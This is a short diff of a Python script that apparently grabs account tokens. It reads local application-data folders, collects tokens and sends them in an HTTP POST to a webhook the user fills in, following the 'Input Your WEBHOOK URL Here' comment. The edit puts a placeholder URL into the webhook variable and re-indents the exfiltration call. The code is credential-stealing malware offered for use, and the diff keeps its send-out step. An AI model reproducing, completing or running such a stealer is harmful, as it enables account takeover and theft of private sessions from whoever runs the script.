@@ -2,7 +2,7 @@ import os
 import re
 import requests
 import json
-webhook = ""  # Input Your WEBHOOK URL Here
+webhook = "https://youtube.com"  # Input Your WEBHOOK URL Here
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 tokens = []
@@ -96,6 +96,6 @@ for p, path in paths.items():
                     }]
                     
                 }
-               requests.post(webhook, data = json.dumps(data).encode(), headers = {'Content-Type': "application/json"})
+            requests.post(webhook, data = json.dumps(data).encode(), headers = {'Content-Type': "application/json"})
 
 
